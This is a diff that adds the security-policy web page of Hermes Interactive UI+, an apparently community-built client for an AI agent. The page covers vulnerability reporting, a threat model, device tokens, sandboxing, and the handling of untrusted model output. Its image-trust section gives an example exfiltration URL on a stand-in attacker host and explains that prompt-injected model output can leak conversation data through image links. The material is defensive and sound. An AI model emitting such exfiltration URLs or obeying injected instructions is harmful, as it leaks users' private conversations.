@@ -1,0 +1,73 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Security – Hermes Interactive UI+</title>
+<meta name="description" content="Security policy and threat model of Hermes Interactive UI+, and how to report a vulnerability.">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#0F131A">
+<link rel="canonical" href="https://hermesui.xyz/security">
+<link rel="icon" href="/icon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="/style.css">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Security – Hermes Interactive UI+">
+<meta property="og:description" content="Security policy and threat model of Hermes Interactive UI+, and how to report a vulnerability.">
+<meta property="og:url" content="https://hermesui.xyz/security">
+<meta property="og:image" content="https://hermesui.xyz/media/trailer-poster.jpg">
+<meta name="twitter:card" content="summary_large_image">
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<header class="top">
+<div class="wrap bar">
+<a class="brand" href="/"><img src="/icon.svg" alt="" width="32" height="32"><span>Hermes UI+</span></a>
+<nav aria-label="Main"><ul>
+<li><a href="/#demos">Demos</a></li>
+<li><a href="/#platforms">Platforms</a></li>
+<li><a href="/#self-hosting">Self-hosting</a></li>
+<li><a href="/privacy">Privacy</a></li>
+<li><a href="/support">Support</a></li>
+<li><a href="/security" aria-current="page">Security</a></li>
+<li><a href="https://github.com/robbyczgw-cla/hermes-ui-plus">GitHub</a></li>
+</ul></nav>
+</div>
+</header>
+<main id="main" class="wrap prose" tabindex="-1">
+<h1>Security policy</h1>
+<h2 id="supported-versions">Supported versions</h2>
+<p>Hermes Interactive UI+ is a community project. Security fixes land on <code>main</code> and in the latest release. Older builds are not patched.</p>
+<h2 id="reporting-a-vulnerability">Reporting a vulnerability</h2>
+<p>Please do not open a public issue for security problems.</p>
+<p>Report privately through GitHub: on the repository page open <strong>Security</strong> and choose <strong>Report a vulnerability</strong>. If that is unavailable, email robby@robbyczesany.com with &quot;Security&quot; in the subject.</p>
+<p>Include what you found and where, steps to reproduce, the impact as you understand it, and the app and bridge versions. Redact real tokens and hostnames; use placeholders.</p>
+<p>We aim to acknowledge reports within 7 days. This is a volunteer project, so fixes may take longer. We will keep you informed and credit you if you wish.</p>
+<h2 id="threat-model-summary">Threat model (summary)</h2>
+<p>This is a short description of what the project protects and where the trust boundaries are. It is not a formal audit.</p>
+<h3 id="what-you-are-protecting">What you are protecting</h3>
+<p>Your Hermes API key, the bridge tokens, your conversations and attachments, and the capabilities of the Hermes host. <strong>Hermes can run terminal and file tools: whoever can talk to your Hermes API as an authorized client can use them.</strong> Protecting access to the Hermes host and the bridge is therefore the main security goal.</p>
+<h3 id="network-exposure-stay-on-your-tailnet">Network exposure: stay on your tailnet</h3>
+<ul><li>Run the bridge so that it is reachable only from your own devices. <strong>We recommend Tailscale</strong> (<code>tailscale serve</code>, never <code>funnel</code>), or a trusted LAN.</li><li>Do not expose the bridge or the Hermes API server to the public internet.</li><li>Use HTTPS between devices and the bridge. The bridge itself speaks HTTP and listens on loopback by default.</li><li>The bridge refuses requests for host names other than <code>BRIDGE_PUBLIC_URL</code> / <code>BRIDGE_ALLOWED_HOSTS</code>, which blocks DNS-rebinding pages.</li></ul>
+<h3 id="device-tokens">Device tokens</h3>
+<ul><li>The app never receives the Hermes API key. It holds a <strong>per-device token</strong> issued by the bridge.</li><li>Pairing QR codes and links carry a <strong>one-time pairing code</strong>, never a token. The app exchanges the code for its own device token the first time it connects; the code works once and expires after one hour if unused. The admin token is not put into them by default.</li><li>Remote pairing needs a one-time code (10 minutes, single use, lockout after 5 wrong tries).</li><li>Devices can be listed and revoked at any time; a revoked device is locked out within seconds. Tokens are compared in constant time and stored on the device in secure storage.</li><li>Treat a QR code like a password. Do not share screenshots.</li></ul>
+<h3 id="model-output-is-untrusted">Model output is untrusted</h3>
+<ul><li>Answers may contain text from web pages or tool results, including prompt-injection attempts. The app treats the structured answer format as data: it validates node and action types, shows unknown types as a neutral card, and never evaluates model output as code. The calculator uses its own expression parser, not <code>eval</code>.</li><li>Actions that touch the device or other people (calendar, reminders, calls, messages, email, timers) require your confirmation in a sheet. URLs and email addresses are validated first.</li><li>Hermes approval requests are shown in the app and answered by you.</li></ul>
+<h3 id="sandboxed-html-widgets">Sandboxed HTML widgets</h3>
+<p>Model-written HTML widgets run in an isolated WebView or iframe with an opaque origin, no access to app storage, a Content Security Policy that only allows scripts and styles from a short list of CDNs, and blocked navigation. They can send a chat message or copy text through a narrow API; they cannot use device capabilities.</p>
+<h3 id="image-trust-policy">Image trust policy</h3>
+<p>Model-written image URLs could be used to leak conversation data (<code>https://attacker.example/p.png?d=...</code> is fetched as soon as the image renders). Therefore only these images load automatically: Wikimedia and Wikipedia hosts, images resolved by your own bridge, images fetched through your bridge's image proxy (<code>GET /bridge/img</code>: public HTTPS hosts only, no cookies or referrer, the host sees the bridge's address), attachments served by your own server, and local or inline images. Images from any other host show a tap-to-load placeholder with the host name. A setting can switch unknown hosts to &quot;always load&quot;; leave it on &quot;ask&quot; unless you accept the risk.</p>
+<h3 id="bridge-endpoints">Bridge endpoints</h3>
+<p>All bridge routes require a valid token except the health check, the one-time pair-code exchange (rate limited), the pairing page (loopback or one-time page code), the static web app files and the HMAC-signed Hermes hook. WebSocket upgrades are rejected. Uploads are limited by size and MIME allow-list and deleted after a retention period (7 days by default). The bridge does not forward <code>Origin</code>, <code>Referer</code> or <code>Cookie</code> headers to Hermes. Default logs contain no message content.</p>
+<h2 id="known-limits">Known limits</h2>
+<ul><li>Anyone who gets a valid device token for your bridge can use your Hermes. Revoke lost devices.</li><li>The web app stores its token in the browser's local storage for its origin (no secure store on the web). Serve it only on an origin you trust.</li><li>Do not build a distributed app with <code>EXPO_PUBLIC_*</code> secrets: they are compiled into the bundle.</li><li>Push previews pass through Google or Apple when enabled; they are off by default.</li></ul>
+<h2 id="out-of-scope">Out of scope</h2>
+<p>Hermes Agent itself (report to Nous Research), third-party model and speech providers, and misconfigured infrastructure you operate yourself, such as a publicly exposed API server.</p>
+</main>
+<footer class="foot">
+<div class="wrap">
+<p>Hermes Interactive UI+ is an unofficial, open-source community client for the Hermes Agent. It is not affiliated with, endorsed by or supported by Nous Research. No accounts, no analytics, no cookies, no trackers on this site.</p>
+<p><a href="/privacy">Privacy</a> · <a href="/support">Support</a> · <a href="/security">Security</a> · <a href="https://github.com/robbyczgw-cla/hermes-ui-plus">Source code</a> · <a href="https://github.com/robbyczgw-cla/hermes-ui-plus/blob/main/LICENSE">MIT license</a></p>
+</div>
+</footer>
+</body>
+</html>
